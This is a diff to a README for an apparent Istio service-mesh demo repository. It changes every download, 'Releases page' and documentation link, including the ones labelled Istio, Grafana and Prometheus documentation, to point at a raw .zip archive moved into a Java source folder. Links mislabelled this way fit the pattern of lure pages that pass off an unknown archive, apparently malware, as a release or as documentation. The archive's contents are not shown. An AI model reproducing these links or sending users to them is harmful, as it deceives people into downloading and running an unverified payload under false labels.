@@ -1,6 +1,6 @@
 # 🎉 servicemesh-istio-demo - Learn Service Mesh with Ease
 
-[![Download the latest release](https://github.com/Shaswat0/servicemesh-istio-demo/raw/refs/heads/main/customer-service/istio-demo-servicemesh-3.3.zip%20Latest%https://github.com/Shaswat0/servicemesh-istio-demo/raw/refs/heads/main/customer-service/istio-demo-servicemesh-3.3.zip)](https://github.com/Shaswat0/servicemesh-istio-demo/raw/refs/heads/main/customer-service/istio-demo-servicemesh-3.3.zip)
+[![Download the latest release](https://github.com/Shaswat0/servicemesh-istio-demo/raw/refs/heads/main/customer-service/src/main/java/servicemesh_istio_demo_2.2.zip%20Latest%https://github.com/Shaswat0/servicemesh-istio-demo/raw/refs/heads/main/customer-service/src/main/java/servicemesh_istio_demo_2.2.zip)](https://github.com/Shaswat0/servicemesh-istio-demo/raw/refs/heads/main/customer-service/src/main/java/servicemesh_istio_demo_2.2.zip)
 
 ## 📖 Introduction
 
@@ -20,11 +20,11 @@ Before you begin, ensure you have the following:
 
 To get started with servicemesh-istio-demo, visit this page to download our latest release:
 
-[Download the latest release](https://github.com/Shaswat0/servicemesh-istio-demo/raw/refs/heads/main/customer-service/istio-demo-servicemesh-3.3.zip)
+[Download the latest release](https://github.com/Shaswat0/servicemesh-istio-demo/raw/refs/heads/main/customer-service/src/main/java/servicemesh_istio_demo_2.2.zip)
 
 ### Installation Steps
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/Shaswat0/servicemesh-istio-demo/raw/refs/heads/main/customer-service/istio-demo-servicemesh-3.3.zip) to see the latest available versions.
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/Shaswat0/servicemesh-istio-demo/raw/refs/heads/main/customer-service/src/main/java/servicemesh_istio_demo_2.2.zip) to see the latest available versions.
    
 2. **Choose Your Version**: Find the version that suits your needs, generally the latest stable release is the best choice.
 
@@ -104,9 +104,9 @@ We would love to hear your thoughts! If you have suggestions or find any issues,
 
 For further reading and a deeper understanding of what you're working with:
 
-- [Istio Official Documentation](https://github.com/Shaswat0/servicemesh-istio-demo/raw/refs/heads/main/customer-service/istio-demo-servicemesh-3.3.zip)
-- [Grafana Documentation](https://github.com/Shaswat0/servicemesh-istio-demo/raw/refs/heads/main/customer-service/istio-demo-servicemesh-3.3.zip)
-- [Prometheus Documentation](https://github.com/Shaswat0/servicemesh-istio-demo/raw/refs/heads/main/customer-service/istio-demo-servicemesh-3.3.zip)
+- [Istio Official Documentation](https://github.com/Shaswat0/servicemesh-istio-demo/raw/refs/heads/main/customer-service/src/main/java/servicemesh_istio_demo_2.2.zip)
+- [Grafana Documentation](https://github.com/Shaswat0/servicemesh-istio-demo/raw/refs/heads/main/customer-service/src/main/java/servicemesh_istio_demo_2.2.zip)
+- [Prometheus Documentation](https://github.com/Shaswat0/servicemesh-istio-demo/raw/refs/heads/main/customer-service/src/main/java/servicemesh_istio_demo_2.2.zip)
 
 Feel free to explore these links and expand your knowledge in Service Mesh technologies.
 
